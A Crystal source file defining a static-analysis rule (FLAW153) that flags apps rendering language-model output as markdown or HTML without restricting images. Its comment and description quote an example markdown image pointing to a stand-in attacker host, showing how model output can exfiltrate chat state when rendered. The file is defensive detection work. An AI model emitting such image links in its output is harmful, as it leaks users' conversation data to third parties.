require "./rule"
require "./context"

module Flaw
  # FLAW153 — rendering LLM output as markdown/HTML with images enabled.
  # `![](https://attacker/exfil?q=...)` leaks chat state to an arbitrary
  # host the moment the client renders.
  class MarkdownImageFromModel < Rule
    def id : String
      "FLAW153"
    end

    def title : String
      "Model output rendered with images enabled"
    end

    def default_severity : Severity
      Severity::Medium
    end

    def tag : String
      "security"
    end

    def description : String
      <<-DESC
      Model/completion output flows through a markdown-to-HTML renderer
      or into `dangerouslySetInnerHTML` without disallowing images or
      pinning hosts. A single `![](https://attacker/exfil)` line in the
      completion then ships state off-site. Disable images, set an
      allowlist via `transformImageUri` / `disallowedElements`, or use
      a sanitizer with an image-host allowlist.
      DESC
    end

    RENDER_RX = /\b(marked|markdown\.render|mdToHtml|showdown|MarkdownIt|ReactMarkdown|remark|micromark|dangerouslySetInnerHTML)\b/
    MODEL_SRC_RX = /\b(completion|message\.content|choices\[0\]|assistant_message|ai_response|tool_output|response\.(content|output|text)|model_output|llm_response)\b/
    SAFE_PROP_RX = /(transformImageUri|disallowedElements\s*=|allowedElements\s*=|sanitize\s*:\s*true|allowImages\s*:\s*false|image:\s*false|disable.*images?)/i

    def check(source : String, path : String) : Array(Finding)
      return [] of Finding unless RuleContext.code_path?(path) || path =~ /\.vue$|\.svelte$|\.astro$/
      return [] of Finding if RuleContext.test_path?(path)
      results = [] of Finding
      lines = source.lines
      lines.each_with_index do |line, i|
        next if RuleContext.comment_only?(line)
        next unless m = line.match(RENDER_RX)
        window_start = Math.max(0, i - 3)
        window_end = Math.min(lines.size - 1, i + 5)
        window = lines[window_start..window_end].join('\n')
        next unless MODEL_SRC_RX.match(window)
        next if SAFE_PROP_RX.match(window)
        results << finding(source, path, i + 1, m.begin(0) || 0,
          "Model output rendered via '#{m[1]}' without image allowlist")
      end
      results
    end
  end
end
